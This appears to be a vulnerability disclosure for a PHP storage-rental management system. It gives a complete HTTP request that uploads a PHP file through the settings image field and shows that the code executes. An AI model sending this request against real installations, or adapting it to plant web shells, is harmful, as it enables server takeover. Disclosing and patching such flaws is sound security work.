# Storage Unit Rental Management System v1.0 by oretnom23 has arbitrary code execution (RCE)

BUG_Author: qingning988

vendors: https://www.sourcecodester.com/php/14932/storage-unit-rental-management-system-using-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability url: ip/storage/classes/SystemSettings.php?f=update_settings

Loophole location: Storage Unit Rental Management System's "/storage/classes/SystemSettings.php?f=update_settings" file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /storage/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/storage/admin/?page=system_info
Content-Length: 616
Content-Type: multipart/form-data; boundary=---------------------------17775797415769
Cookie: PHPSESSID=7hamglse0h7kpa6fbhgomf5j84
Connection: close

-----------------------------17775797415769
Content-Disposition: form-data; name="name"

Storage Unit Rental Management System - PHP
-----------------------------17775797415769
Content-Disposition: form-data; name="short_name"

SURMS - PHP
-----------------------------17775797415769
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------17775797415769
Content-Disposition: form-data; name="cover"; filename=""
Content-Type: application/octet-stream


-----------------------------17775797415769--
```

The files will be uploaded to this directory \storage\uploads
![image](https://user-images.githubusercontent.com/54017627/228192258-eda3bfa6-347a-46e2-882d-d99ae90d8130.png)


We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/228192542-125a1624-90e8-45dc-ac6f-cab1635964e8.png)
